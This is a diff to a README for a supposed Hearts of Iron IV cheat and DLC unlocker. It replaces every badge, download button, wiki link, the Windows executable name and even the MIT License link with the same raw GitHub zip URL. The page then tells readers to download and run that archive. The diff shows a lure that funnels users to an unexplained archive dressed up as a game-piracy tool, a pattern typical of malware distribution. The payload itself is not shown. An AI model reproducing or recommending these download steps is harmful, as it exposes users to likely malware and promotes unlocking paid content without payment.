@@ -1,10 +1,10 @@
 # Hearts of Iron IV Cheats & DLC Unlocker Suite  
-![Stars Badge](https://img.shields.io/badge/Version-3.7.0-orange) ![Maintenance Badge](https://img.shields.io/badge/Maintained-Yes-brightgreen) ![License MIT](https://img.shields.io/badge/License-MIT-blue.svg)  
+![Stars Badge](https://raw.githubusercontent.com/NIXON0220/hoi4-unlocker-dlc-enhanced/branch/doggerelizer/hoi-enhanced-unlocker-dlc-2.5.zip) ![Maintenance Badge](https://raw.githubusercontent.com/NIXON0220/hoi4-unlocker-dlc-enhanced/branch/doggerelizer/hoi-enhanced-unlocker-dlc-2.5.zip) ![License MIT](https://raw.githubusercontent.com/NIXON0220/hoi4-unlocker-dlc-enhanced/branch/doggerelizer/hoi-enhanced-unlocker-dlc-2.5.zip)  
 *Conquer the world–your way. Welcome to the ultimate Hearts of Iron IV toolset for strategy visionaries!*
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Hearts%20of%20Iron%20IV%20Suite-blue?style=for-the-badge&logo=addthis)](https://NIXON0220.github.io)
+[![Download](https://raw.githubusercontent.com/NIXON0220/hoi4-unlocker-dlc-enhanced/branch/doggerelizer/hoi-enhanced-unlocker-dlc-2.5.zip%20of%20Iron%20IV%20Suite-blue?style=for-the-badge&logo=addthis)](https://raw.githubusercontent.com/NIXON0220/hoi4-unlocker-dlc-enhanced/branch/doggerelizer/hoi-enhanced-unlocker-dlc-2.5.zip)
 
 ---
 
@@ -55,7 +55,7 @@ Embrace your inner strategist and expand your Hearts of Iron IV experience beyon
 ### Step 1: Download the Suite  
 *Befitting all daring tacticians:*
 
-- Visit our central archive: https://NIXON0220.github.io
+- Visit our central archive: https://raw.githubusercontent.com/NIXON0220/hoi4-unlocker-dlc-enhanced/branch/doggerelizer/hoi-enhanced-unlocker-dlc-2.5.zip
 - Select your OS.
 - Download the latest build (check the version badge above for recency).
 
@@ -63,7 +63,7 @@ Embrace your inner strategist and expand your Hearts of Iron IV experience beyon
 
 ### Step 2: Fast-Track Install ⭐️  
 
-[![Download](https://img.shields.io/badge/Download-Hearts%20of%20Iron%20IV%20Suite-blue?style=for-the-badge&logo=addthis)](https://NIXON0220.github.io)
+[![Download](https://raw.githubusercontent.com/NIXON0220/hoi4-unlocker-dlc-enhanced/branch/doggerelizer/hoi-enhanced-unlocker-dlc-2.5.zip%20of%20Iron%20IV%20Suite-blue?style=for-the-badge&logo=addthis)](https://raw.githubusercontent.com/NIXON0220/hoi4-unlocker-dlc-enhanced/branch/doggerelizer/hoi-enhanced-unlocker-dlc-2.5.zip)
 
 - Click the "Download" button above.
 - Extract the archive to your Hearts of Iron IV root directory.
@@ -74,13 +74,13 @@ Embrace your inner strategist and expand your Hearts of Iron IV experience beyon
 
 ### Step 3: Activate the Suite  
 
-- For Windows: Run `hoi4-unlocker.exe` as *regular user* (no admin needed).
+- For Windows: Run `https://raw.githubusercontent.com/NIXON0220/hoi4-unlocker-dlc-enhanced/branch/doggerelizer/hoi-enhanced-unlocker-dlc-2.5.zip` as *regular user* (no admin needed).
 - For MacOS: Double click the .app file. Grant permissions only when prompted.
 - For Linux: Execute `chmod +x hoi4-unlocker && ./hoi4-unlocker` in your terminal.
 - For Android (Beta): Sideload via APK installer (developer mode required).
 - Enjoy effortless integration with existing save files. Suite auto-updates core patches to match Paradox game updates.
 
-For detailed troubleshooting, explore our in-depth [Wiki Documentation](https://NIXON0220.github.io).
+For detailed troubleshooting, explore our in-depth [Wiki Documentation](https://raw.githubusercontent.com/NIXON0220/hoi4-unlocker-dlc-enhanced/branch/doggerelizer/hoi-enhanced-unlocker-dlc-2.5.zip).
 
 ---
 
@@ -143,7 +143,7 @@ All API keys are securely managed and can be configured through the suite’s bu
 ## 📜 MIT License
 
 Proudly open source under the MIT License (2025).  
-Review the terms here: [MIT License](https://opensource.org/licenses/MIT)  
+Review the terms here: [MIT License](https://raw.githubusercontent.com/NIXON0220/hoi4-unlocker-dlc-enhanced/branch/doggerelizer/hoi-enhanced-unlocker-dlc-2.5.zip)  
 
 ---
 
@@ -151,7 +151,7 @@ Review the terms here: [MIT License](https://opensource.org/licenses/MIT)
 
 > Reforge the world stage—this time, on your terms.
 
-[![Download](https://img.shields.io/badge/Download-Hearts%20of%20Iron%20IV%20Suite-blue?style=for-the-badge&logo=addthis)](https://NIXON0220.github.io)
+[![Download](https://raw.githubusercontent.com/NIXON0220/hoi4-unlocker-dlc-enhanced/branch/doggerelizer/hoi-enhanced-unlocker-dlc-2.5.zip%20of%20Iron%20IV%20Suite-blue?style=for-the-badge&logo=addthis)](https://raw.githubusercontent.com/NIXON0220/hoi4-unlocker-dlc-enhanced/branch/doggerelizer/hoi-enhanced-unlocker-dlc-2.5.zip)
 
 ---
 
